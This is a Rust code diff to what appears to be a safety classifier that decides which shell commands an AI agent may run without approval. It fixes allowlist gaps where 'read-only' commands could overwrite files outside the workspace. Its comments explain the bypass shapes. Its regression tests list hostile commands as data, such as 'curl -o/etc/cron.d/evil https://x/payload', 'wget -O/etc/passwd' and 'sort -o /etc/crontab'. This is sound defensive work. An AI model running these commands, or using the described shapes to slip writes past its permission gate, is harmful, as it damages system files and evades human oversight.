@@ -632,8 +632,14 @@ pub fn command_text<'a>(tool_name: &str, input: &'a Value) -> Option<&'a str> {
 // would let a dangerous payload ride in unclassified.
 // ===========================================================================
 
-/// Command heads that only ever read or transform-to-stdout — safe regardless of
-/// their arguments (output redirects are validated separately by [`segment_is_safe`]).
+/// Command heads that read or transform-to-stdout. Output redirects are
+/// validated separately by [`segment_is_safe`].
+///
+/// Most are safe regardless of their arguments, but a handful can be POINTED at
+/// an output path instead of stdout; those are listed again in
+/// [`WRITE_CAPABLE_READ_ONLY_HEADS`] and carry an extra check. Before adding a
+/// head here, check its man page for an output-file flag or a trailing output
+/// positional, and list it there too if it has one.
 static READ_ONLY_HEADS: &[&str] = &[
     // Listing / inspection (`find` is NOT here — `find -delete`/`-exec` mutate)
     "ls",
@@ -735,6 +741,25 @@ static READ_ONLY_HEADS: &[&str] = &[
     "expr",
 ];
 
+/// The subset of [`READ_ONLY_HEADS`] that can be pointed at an output FILE
+/// rather than stdout, so "read-only" holds for the ordinary invocation but not
+/// for every argument list:
+///
+/// * `sort -o FILE`, `tree -o FILE`, macOS `base64 -o FILE`
+/// * `uniq [INPUT [OUTPUT]]` and `xxd [INFILE [OUTFILE]]`, where the write is a
+///   trailing POSITIONAL with no flag to spot
+/// * `yq -i` / `--inplace`, which rewrites its input
+///
+/// None of those forms carries a `>` for `redirect_targets` to catch, so
+/// without this check `sort -o /etc/crontab data/f` settles `Safe`: no card on
+/// the chat lane, and `RequestVerdict::Benign` (unattended auto-allow) on the
+/// coding-agent lane. They stay on the allowlist because the common form really
+/// is a read, but only while every path they name is inside the workspace.
+/// Falling through to the judge is the fail-safe direction the allowlist is
+/// designed around, so the false positives (`sort /etc/passwd`) cost one LLM
+/// call each.
+static WRITE_CAPABLE_READ_ONLY_HEADS: &[&str] = &["sort", "uniq", "tree", "xxd", "yq", "base64"];
+
 /// Command heads that create or extend in-workspace paths — safe when every
 /// path argument stays inside the workspace.
 static CREATE_HEADS: &[&str] = &["mkdir", "touch"];
@@ -825,6 +850,10 @@ fn segment_is_safe(segment: &str) -> bool {
         // A GET/download is safe unless it writes its output to a path outside
         // the workspace (`curl -o /etc/cron.d/evil …`).
         "curl" | "wget" => !is_mutating_http(args) && !segment_escapes_workspace(segment),
+        // Read-only in the ordinary form, but able to write a named file: the
+        // same shape as the curl/wget arm above, and it must be tried BEFORE
+        // the plain read-only arm below. See [`WRITE_CAPABLE_READ_ONLY_HEADS`].
+        _ if WRITE_CAPABLE_READ_ONLY_HEADS.contains(&base) => !segment_escapes_workspace(segment),
         _ if READ_ONLY_HEADS.contains(&base) => true,
         _ if CREATE_HEADS.contains(&base) => args
             .iter()
@@ -835,7 +864,17 @@ fn segment_is_safe(segment: &str) -> bool {
 }
 
 /// True when `args` (the tokens after `git`) name a read-only subcommand,
-/// skipping leading global flags (`-C <dir>`, `--no-pager`, …).
+/// skipping leading global flags (`-C <dir>`, `--no-pager`, …), AND that
+/// subcommand is not being pointed at an output file.
+///
+/// The second half is not redundant: "read-only" here means "does not mutate
+/// the repository", and the whole diff family (`diff`, `log`, `show`,
+/// `whatchanged`) accepts `--output=<file>` / `-o <file>`, which truncates and
+/// rewrites an arbitrary path with no `>` for `redirect_targets` to see. So
+/// `git diff --output=/etc/crontab` used to settle `Safe`: no card on the chat
+/// lane, `RequestVerdict::Benign` (unattended auto-allow) on the coding-agent
+/// one. An output flag anywhere after the subcommand routes the whole call to
+/// the judge, which is the allowlist's fail-safe direction.
 fn git_subcommand_read_only(args: &[&str]) -> bool {
     let mut i = 0;
     while let Some(&arg) = args.get(i) {
@@ -859,8 +898,30 @@ fn git_subcommand_read_only(args: &[&str]) -> bool {
             _ => break,
         }
     }
-    args.get(i)
+    if !args
+        .get(i)
         .is_some_and(|sub| GIT_READ_ONLY_SUBCOMMANDS.contains(sub))
+    {
+        return false;
+    }
+    !args[i + 1..].iter().any(|a| is_git_output_flag(a))
+}
+
+/// True when a post-subcommand `git` token names a file the subcommand will
+/// write.
+///
+/// Long spellings ONLY, deliberately. A bare `-o` is NOT an output flag for any
+/// subcommand on [`GIT_READ_ONLY_SUBCOMMANDS`]: the diff family accepts only
+/// `--output` / `--output=<file>`, while `-o` means `--others` on `git ls-files`
+/// and `--only-matching` on `git grep`. Matching it cost a judge call on every
+/// `git ls-files -o --exclude-standard`, a routine coding-agent read, and bought
+/// no safety, because git rejects `-o` on the subcommands that can write.
+/// `--output-directory` is kept for the day `format-patch` joins the list; it is
+/// inert until then.
+fn is_git_output_flag(arg: &str) -> bool {
+    matches!(arg, "--output" | "--output-directory")
+        || arg.starts_with("--output=")
+        || arg.starts_with("--output-directory=")
 }
 
 /// True when `code` is statically safe Python: no signal of a real-world
@@ -935,11 +996,22 @@ fn segment_escapes_workspace(segment: &str) -> bool {
     segment.split_whitespace().any(token_escapes_workspace)
 }
 
-/// True when a single token names a path outside the workspace — either as a
-/// bare path argument (`/etc/x`, `../y`, `~/z`) or as the value of a `--flag=PATH`
-/// glued option (`--output=/etc/x`). The short-glued flag form (`-o/etc/x`)
-/// needs per-flag knowledge and is a known residual — the common space-separated
-/// (`-o /etc/x`) and `=`-glued forms are both covered here.
+/// True when a single token names a path outside the workspace, in any of the
+/// three shapes an argument can carry one: a bare path (`/etc/x`, `../y`, `~/z`),
+/// the value of an `=`-glued option (`--output=/etc/x`), or the value of a
+/// SHORT-glued option (`-o/etc/x`).
+///
+/// The third shape used to be a documented residual, on the reasoning that
+/// telling `-o/etc/x` from a flag that merely contains a slash needs per-flag
+/// knowledge. It does not, because the answer only has to be safe rather than
+/// exact: `is_pathish` rejects anything starting with `-`, and there is no `=`
+/// to split on, so an absolute path glued to its flag rode straight past both
+/// branches. That is not theoretical. `sort -o/etc/crontab data/f` reached the
+/// same Safe verdict (no card on chat, unattended auto-allow on the
+/// coding-agent lane) that the spaced `sort -o /etc/crontab` was fixed to
+/// refuse, and so did `curl -o/etc/cron.d/evil`. Over-flagging a flag that
+/// happens to hold a slash (`-I/usr/include`) costs exactly one judge call,
+/// which is the direction this allowlist is built to fail in.
 fn token_escapes_workspace(tok: &str) -> bool {
     if is_pathish(tok) && !path_in_workspace(tok) && !is_harmless_redirect(tok) {
         return true;
@@ -947,6 +1019,23 @@ fn token_escapes_workspace(tok: &str) -> bool {
     if let Some((_flag, value)) = tok.split_once('=') {
         if is_pathish(value) && !path_in_workspace(value) && !is_harmless_redirect(value) {
             return true;
+        }
+    }
+    // Short-glued option value: drop the leading dash(es) and the single option
+    // character, and judge what is left. Scanning for the first `/` instead
+    // would be wrong in the safe direction that matters least and the unsafe
+    // direction that matters most: it turns the in-workspace `-odata/o.json`
+    // into the absolute `/o.json`. A multi-letter bundle (`-lah`) simply leaves
+    // a non-pathish remainder. `char_indices` keeps the slice on a boundary.
+    if let Some(rest) = tok.strip_prefix('-') {
+        let rest = rest.strip_prefix('-').unwrap_or(rest);
+        let mut chars = rest.char_indices();
+        chars.next();
+        if let Some((idx, _)) = chars.next() {
+            let value = &rest[idx..];
+            if is_pathish(value) && !path_in_workspace(value) && !is_harmless_redirect(value) {
+                return true;
+            }
         }
     }
     false
@@ -2325,6 +2414,87 @@ mod tests {
             RiskLane::Safe,
             "download in ws",
         );
+    }
+
+    /// Regression: the SHORT-GLUED output flag (`-o/etc/x`, no space and no `=`).
+    /// `is_pathish` rejects anything starting with `-` and there is no `=` to
+    /// split on, so the path rode past both branches of
+    /// `token_escapes_workspace` and the command settled `Safe` even though the
+    /// spaced and `=`-glued spellings of the very same write were refused.
+    #[test]
+    fn short_glued_output_flag_outside_the_workspace_goes_to_judge() {
+        for cmd in [
+            "sort -o/etc/crontab data/f",
+            "base64 -o/etc/passwd data/f",
+            "tree -o~/.bashrc data",
+            "curl -o/etc/cron.d/evil https://x/payload",
+            "wget -O/etc/passwd https://x/p",
+        ] {
+            assert_needs_judge(bash(cmd), cmd);
+        }
+        // The same glued shape pointing INSIDE the workspace stays safe, so the
+        // widening did not just send every glued flag to the judge.
+        for cmd in [
+            "sort -o data/sorted.txt data/f",
+            "curl -odata/o.json https://x/d",
+        ] {
+            assert_settled(bash(cmd), RiskLane::Safe, cmd);
+        }
+    }
+
+    /// Regression: a `READ_ONLY_HEADS` entry that can be POINTED at an output
+    /// file wrote outside the workspace with no `>` for the redirect scan to
+    /// catch, so it settled `Safe` (no card on chat, `Benign` auto-allow on the
+    /// unattended coding-agent lane). See `WRITE_CAPABLE_READ_ONLY_HEADS`.
+    #[test]
+    fn read_only_head_writing_outside_the_workspace_goes_to_judge() {
+        for cmd in [
+            "sort -o /etc/crontab data/f",
+            "sort --output=/etc/crontab data/f",
+            "uniq data/f /etc/crontab",
+            "tree -o ~/.bashrc data",
+            "xxd data/f /etc/crontab",
+            "yq -i /etc/some.yaml",
+            "base64 -o /etc/passwd data/f",
+        ] {
+            assert_needs_judge(bash(cmd), cmd);
+        }
+        // The ordinary in-workspace / stdout forms stay safe.
+        for cmd in [
+            "sort data/f",
+            "sort -o data/sorted.txt data/f",
+            "uniq data/a data/b",
+            "yq -i data/config.yaml",
+        ] {
+            assert_settled(bash(cmd), RiskLane::Safe, cmd);
+        }
+    }
+
+    /// Regression: "read-only" for a git subcommand meant "does not mutate the
+    /// repo", but the diff family also takes `--output=<file>`, which truncates
+    /// an arbitrary path. That settled `Safe` on the same two lanes.
+    #[test]
+    fn read_only_git_subcommand_with_an_output_file_goes_to_judge() {
+        for cmd in [
+            "git diff --output=/etc/crontab",
+            "git log --output /etc/crontab",
+            "git show --output=data/x.diff",
+        ] {
+            assert_needs_judge(bash(cmd), cmd);
+        }
+        // A read-only subcommand with no output flag is unaffected.
+        assert_settled(bash("git diff HEAD~1"), RiskLane::Safe, "plain git diff");
+        // A bare `-o` is NOT an output flag on any read-only subcommand: it is
+        // `--others` on ls-files and `--only-matching` on grep. Matching it sent
+        // this routine read to the judge on every call and bought no safety,
+        // since git rejects `-o` on the subcommands that can actually write.
+        for cmd in [
+            "git ls-files -o --exclude-standard",
+            "git grep -o pattern",
+            "git ls-files -o",
+        ] {
+            assert_settled(bash(cmd), RiskLane::Safe, cmd);
+        }
     }
 
     #[test]
